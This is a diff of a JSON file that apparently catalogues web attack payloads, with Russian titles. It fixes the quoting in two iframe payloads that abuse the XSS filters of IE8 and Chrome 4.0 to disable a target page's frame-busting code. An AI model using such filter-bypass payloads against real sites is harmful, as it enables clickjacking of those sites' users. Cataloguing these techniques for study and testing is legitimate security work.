@@ -151,7 +151,7 @@
       "title": "IE8 XSS filter — индуцируем ложное срабатывание",
       "language": "html",
       "tags": ["bypass", "xss-filter", "ie8"],
-      "body": "<iframe src=”http://target site/?param=<script>if”>"
+      "body": "<iframe src=\"http://target site/?param=<script>if\">"
     },
     {
       "subcategory": "Обход frame-busting",
@@ -165,7 +165,7 @@
       "title": "Chrome 4.0 XSSAuditor — точечное отключение скрипта",
       "language": "html",
       "tags": ["bypass", "xss-filter", "xssauditor"],
-      "body": "<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>"
+      "body": "<iframe src=\"http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D\">"
     },
     {
       "subcategory": "Обход frame-busting",
